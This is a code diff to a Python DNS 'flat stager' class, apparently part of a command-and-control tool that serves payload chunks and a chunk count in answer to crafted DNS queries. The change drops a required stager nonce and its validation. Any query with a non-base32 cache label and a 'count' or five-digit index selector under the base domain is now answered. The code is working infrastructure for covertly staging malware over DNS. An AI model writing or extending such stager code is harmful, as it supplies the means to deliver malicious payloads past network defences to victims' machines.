@@ -14,11 +14,11 @@ from ...logging_util import log_event
 
 
 class DnsFlatStager(object):
-    def __init__(self, base_domain, stager_nonce, flat_chunks, flat_count,
-                 flat_meta, flat_chunk_size, rtype, cname_suffix,
-                 label_max_len, logger, send_response, send_empty_response):
+    def __init__(self, base_domain, flat_chunks, flat_count, flat_meta,
+                 flat_chunk_size, rtype, cname_suffix, label_max_len, logger,
+                 send_response, send_empty_response):
         self._base_domain = base_domain
-        self._stager_nonce = stager_nonce
+        self._base_suffix = '.%s' % self._base_domain
         self._flat_chunks = flat_chunks
         requested_count = flat_count
         clamped = False
@@ -41,7 +41,6 @@ class DnsFlatStager(object):
         self._send_empty_response = send_empty_response
         self._enabled = bool(self._flat_chunks and self._flat_count)
         if self._enabled:
-            self._stager_nonce = self._normalize_stager_nonce(self._stager_nonce)
             meta_count = self._parse_flat_meta_count(self._flat_meta)
             log_event(
                 self._logger,
@@ -49,7 +48,6 @@ class DnsFlatStager(object):
                 'dns.flat_stager_init',
                 'DNS flat stager initialized',
                 lambda: {
-                    'nonce': self._stager_nonce,
                     'requested_count': requested_count,
                     'flat_count': self._flat_count,
                     'meta_count': meta_count,
@@ -79,16 +77,6 @@ class DnsFlatStager(object):
                 self._flat_meta = struct.pack(
                     '>2sBI', b'SF', 1, self._flat_count
                 )
-            self._flat_count_name = '%s.count.%s' % (
-                self._stager_nonce,
-                self._base_domain,
-            )
-            self._flat_piece_prefix = '%s.' % self._stager_nonce
-            self._flat_piece_suffix = '.%s' % self._base_domain
-        else:
-            self._flat_count_name = None
-            self._flat_piece_prefix = None
-            self._flat_piece_suffix = None
 
     @staticmethod
     def _parse_flat_meta_count(meta):
@@ -102,33 +90,6 @@ class DnsFlatStager(object):
             return None
         return count
 
-    @staticmethod
-    def _normalize_stager_nonce(value):
-        if not value:
-            raise ValueError('dns_stager_nonce required for DNS flat stager')
-        if isinstance(value, bytes):
-            try:
-                value = value.decode('ascii')
-            except UnicodeError:
-                raise ValueError('dns_stager_nonce must be ASCII')
-        value = value.strip().strip('.')
-        if not value:
-            raise ValueError('dns_stager_nonce required for DNS flat stager')
-        try:
-            value.encode('ascii')
-        except UnicodeError:
-            raise ValueError('dns_stager_nonce must be ASCII')
-        if '.' in value:
-            raise ValueError('dns_stager_nonce must be a single label')
-        if len(value) > 63:
-            raise ValueError('dns_stager_nonce must be <= 63 characters')
-        if DnsFlatStager._is_base32_label(value):
-            raise ValueError(
-                'dns_stager_nonce must include non-base32 characters'
-            )
-        return value.lower()
-
-    @staticmethod
     def _is_base32_label(label):
         allowed = set('ABCDEFGHIJKLMNOPQRSTUVWXYZ234567')
         try:
@@ -148,7 +109,20 @@ class DnsFlatStager(object):
         if not self._enabled:
             return False
         name = qname_lower.rstrip('.')
-        if name == self._flat_count_name:
+        if name == self._base_domain:
+            return False
+        if not name.endswith(self._base_suffix):
+            return False
+        prefix = name[:-len(self._base_suffix)]
+        if not prefix:
+            return False
+        parts = prefix.split('.')
+        if len(parts) != 2:
+            return False
+        cache_label, selector = parts
+        if not cache_label or self._is_base32_label(cache_label):
+            return False
+        if selector == 'count':
             if not self._flat_meta:
                 self._send_empty_response(
                     query_id, qname, qtype, addr,
@@ -176,11 +150,7 @@ class DnsFlatStager(object):
                 },
             )
             return True
-        if not name.startswith(self._flat_piece_prefix):
-            return False
-        if not name.endswith(self._flat_piece_suffix):
-            return False
-        index_text = name[len(self._flat_piece_prefix):-len(self._flat_piece_suffix)]
+        index_text = selector
         if len(index_text) != 5 or not index_text.isdigit():
             self._send_empty_response(
                 query_id, qname, qtype, addr,
